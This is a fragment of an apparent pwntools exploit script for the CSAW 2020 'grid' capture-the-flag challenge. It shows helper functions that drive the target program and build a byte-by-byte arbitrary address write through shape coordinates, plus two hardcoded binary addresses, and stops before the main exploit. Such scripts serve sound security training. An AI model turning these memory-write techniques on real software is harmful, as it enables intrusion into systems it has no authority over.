a3632137f3b5465c3b52f2c31fd4b32f|file:///home/neo/CTFs/csaw2020/grid/exploit.py|44|1|V|python
	def create_shape(name, x, y):
	    io.recvuntil('> ')
	    io.sendline(name)
	    io.recvuntil('> ')
	    io.sendline(x + ' ' + y)
	
	def write_addr(addr):
	    global addr_off
	    for c in p64(addr):
	        create_shape(chr(c), '12', str(addr_off))
	        addr_off += 1
	
	def display():
	    io.recvuntil('> ')
	    io.sendline('d')
	
	#===========================================================
	#                    EXPLOIT GOES HERE
	#===========================================================
	
	MAIN_ADDR = 0x400bc0
	SHAPE_ADDR = 0x400e1e
